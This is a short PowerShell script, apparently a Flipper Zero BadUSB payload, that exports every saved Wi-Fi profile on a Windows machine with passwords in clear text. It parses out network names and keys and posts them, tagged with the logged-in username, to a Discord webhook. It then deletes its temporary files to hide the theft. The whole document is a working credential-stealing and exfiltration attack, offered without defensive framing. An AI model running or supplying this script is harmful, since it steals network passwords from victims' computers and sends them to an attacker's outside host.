# Create a temporary directory and change to it
$p = "$env:temp\wifi-passwords"; md $p >$null; cd $p;

# Export all wifi profiles to xml files in the current directory
netsh wlan export profile key=clear >$null;

# Parse the xml files and create a custom object with the name and password
$r = Get-ChildItem | ForEach-Object {
  $Xml = [xml](Get-Content -Path $_.FullName)
  [PSCustomObject]@{
    Name = $Xml.WLANProfile.Name
    Password = $Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial
  }
}

# Format the output as a table in a Markdown code block that overwrites the name of the webhook app with the username of the Windows account you are logged into with string 
$body = @{'username' = $env:username + " on Flipper Exfil"
content = "``````"+($r | Format-Table | Out-String)+"``````"}

# Send the formatted table to a Discord webhook
Invoke-RestMethod -Uri $discord -Method 'post' -Body $body >$null;

# Delete the temporary directory and exit the script
cd ..; rm $p -r -fo; exit;